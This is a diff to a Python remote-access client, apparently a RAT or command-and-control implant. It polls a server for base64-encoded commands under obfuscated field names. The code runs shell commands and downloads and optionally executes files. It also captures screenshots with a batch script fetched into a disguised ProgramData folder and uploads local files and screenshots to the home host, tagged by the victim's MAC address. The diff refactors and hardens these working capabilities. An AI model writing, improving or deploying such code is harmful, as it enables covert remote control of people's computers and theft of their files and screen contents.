@@ -9,7 +9,6 @@ There are no necessary to use them during normal operation.
 
 
 import subprocess
-import re
 import shutil
 from uuid import getnode as get_mac
 import os
@@ -58,7 +57,7 @@ this will be made by server side).
 """
 def send_request(page, data, *args):
 
-    enc_data = base64.b64encode((str(data).replace('\'', '"')).encode('UTF-8')).decode('UTF-8')
+    enc_data = base64.b64encode((str(data).replace('\'', '"')).encode('cp852')).decode('cp852')
     payload = {
         'a3Vyd': enc_data
     }
@@ -139,24 +138,36 @@ def run_command(cmd, *args):
     if len(args) > 0:
         r_args = [x for x in args]
     r_args.insert(0, cmd)
+
+    def grabage_remover(raw):
+
+        output_dec = (raw.replace(b'\xa0', b' ').replace(b'\xff', b',')).decode('cp852', 'ignore')
+        #print(output_dec)
+        output_list = ['<br>' if i == '\n' else i for i in iter(output_dec)]
+        #print(output_list)
+        output = (''.join(output_list)).replace('\r', '')
+        #print(output)
+        return output
+
     try:
-        if len(r_args) > 2 and r_args[-2] == '-timeout':
-            execute = subprocess.Popen(r_args[:-2], stdout=subprocess.PIPE)
-            time.sleep(int(args[-1]))
-            print(execute.pid)
+        if len(args) > 2 and args[-2] == '-timeout':
+            execute = subprocess.Popen(r_args[:-2], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            #print(execute)
+            time.sleep(int(r_args[-1]))
+            #print(execute.pid)
             execute.kill()
-            result = (re.search('b\' (.*)\'', str(execute.stdout.read())).group(1)).replace('\\n', '<br>').replace('\\r', '')
+            result = grabage_remover(execute.stdout.read())
             #print(result)
         else:
-            execute_raw = subprocess.check_output(r_args, shell=True)
-            execute = execute_raw.decode('cp852')
-            execute_list = ['<br>' if i == '\n' else i for i in iter(execute)]
-            result = (''.join(execute_list)).replace(u'\xa0', u' ').replace('\r', '')
+            execute = subprocess.check_output(r_args, shell=True, stderr=subprocess.PIPE)
+            #print(execute)
+            result = grabage_remover(execute)
             #print(result)
         return str('[SUCESS]' + result)
+    except subprocess.CalledProcessError as e:
+        return str('[SUCESS] Output from command: %s') % str(e).replace('\'', '')
     except FileNotFoundError:
-        result = '[ERROR] Executable file not found'
-        return str(result)
+        return str('[ERROR] Executable file or command not found')
 
 
 """
@@ -167,20 +178,21 @@ function.
 
 """
 
-
-def downloader(url, path, *args):
+def file_download(url, path, *args):
     savefilename = url.split('/')[-1]
     r = requests.get(url, stream=True)
-    with open(path + '\\' + savefilename, 'wb') as f:
-        shutil.copyfileobj(r.raw, f)
-    print('Download completed.')
-    if len(args) > 0 and args[0] == '-run':
-        run_command(path + '\\' + savefilename)
-        confirmation = '[SUCESS] File %s downloaded, executed' % url
-        return confirmation
-    else:
-        print('Not requested to run downloaded file.')
-        confirmation = '[SUCESS] File %s downloaded, not executed' % url
+    try:
+        with open(path + '\\' + savefilename, 'wb') as f:
+            shutil.copyfileobj(r.raw, f)
+        if len(args) > 0 and args[0] == '-run':
+            run_command(path + '\\' + savefilename)
+            confirmation = '[SUCESS] File %s downloaded, executed' % url
+            return confirmation
+        else:
+            confirmation = '[SUCESS] File %s downloaded, not executed' % url
+            return confirmation
+    except IOError as e:
+        confirmation = '[ERROR] File %s not downloaded: %s' % (url, str(e).replace('\'', ''))
         return confirmation
 
 
@@ -197,15 +209,11 @@ Message box will be available 30 second, and after this time, it will be killed
 def popup(text, title, *args):
     r_window = tk.Tk()
     r_window.withdraw()
-    print(text)
-    print(title)
+    #print(text)
+    #print(title)
     r_window.after(30000, r_window.destroy)
-    if '_' in text or title:
-        if messagebox.showinfo(text.replace('_', ' '), title.replace('_', ' ')):
-            r_window.destroy()
-    else:
-        if messagebox.showinfo(text, title):
-            r_window.destroy()
+    if messagebox.showinfo(text, title):
+        r_window.destroy()
     confirmation = '[SUCESS] Messagebox showed'
     return confirmation
 
@@ -221,11 +229,11 @@ Name of screenshot is a filtered MAC (without :) and current time.
 
 
 def screenshot(*args):
-    curr_user = os.getlogin()
+    #curr_user = os.getlogin()
     sys_disk = os.getenv("SystemDrive")
     #print(sys_disk)
     app_url = 'https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat'
-    app_dir = sys_disk + '\\Users\\' + curr_user + '\\AppData\\Local\\Temp\\'
+    app_dir = sys_disk + '\\ProgramData\\Applications\\Cache\\'
     #print(app_dir)
     r = s.get(app_url)
     with open(app_dir + 'screenCapture.bat', 'w') as f:
@@ -233,7 +241,7 @@ def screenshot(*args):
     screen_name = (str(time.strftime("%Y%m%d-%H%M%S")) + '_' + det_mac)
     #print(screen_name)
     make_ss = run_command('cd', app_dir, '&&', 'screenCapture.bat', screen_name + '.jpg')
-    send_ss = fileupload(app_dir + screen_name + '.jpg')
+    send_ss = file_upload(app_dir + screen_name + '.jpg')
     if '[SUCESS]' in make_ss and send_ss:
         confirmation = '[SUCESS] Screenshot %s.jpg uploaded' % screen_name
     else:
@@ -241,20 +249,25 @@ def screenshot(*args):
     return confirmation
 
 
-def fileupload(file_path, *args):
-    if os.path.isfile(file_path) == True:
-        cli_data = {
-            'det_mac': det_mac
-        }
-        file = {
-            'f1L3': open(file_path, 'rb')
-        }
-        #say_file = s.post(home_host + '/upload/', files=file, data=payload)
-        send_request('upload', cli_data, file)
-        confirmation = '[SUCESS] File %s uploaded' % file_path
-    else:
-        confirmation = '[ERROR] File %s not exists' % file_path
-    return confirmation
+def file_upload(file_path, *args):
+    try:
+        if os.path.isfile(file_path) == True:
+            cli_data = {
+                'det_mac': det_mac
+            }
+            file = {
+                'f1L3': open(file_path, 'rb')
+            }
+            #say_file = s.post(home_host + '/upload/', files=file, data=payload)
+            send_request('upload', cli_data, file)
+            confirmation = '[SUCESS] File %s uploaded' % file_path
+        else:
+            confirmation = '[ERROR] File %s not exists' % file_path
+        return confirmation
+    except IOError as e:
+        confirmation = '[ERROR] File %s not uploaded: %s' % (file_path, str(e).replace('\'', ''))
+        return confirmation
+
 
 
 """
@@ -321,9 +334,9 @@ while True:
         command_dict = {
             'popup': popup,
             'run_command': run_command,
-            'downloader': downloader,
+            'file_download': file_download,
             'screenshot': screenshot,
-            'upload': fileupload
+            'file_upload': file_upload
         }
         try_ord = 1
         while try_ord < 4:
@@ -340,8 +353,9 @@ while True:
                 subprocess.Popen(['python', script_path])
                 raise SystemExit
         resp_data = say_ready.json()
+        print(resp_data)
         resp_dict = json.loads(base64.b64decode(resp_data['65hFDs']).decode('utf-8'))
-        #print(resp_dict)
+        print(resp_dict)
         time_curr = time.strftime('%Y-%m-%d %H:%M:%S')
         # The pong is necessary, if ID was executed earlier
         pong = time_curr
@@ -386,4 +400,3 @@ while True:
         raise SystemExit
     print('++++ SLEEP NA 10 SEKUND ++++')
     time.sleep(10)
-
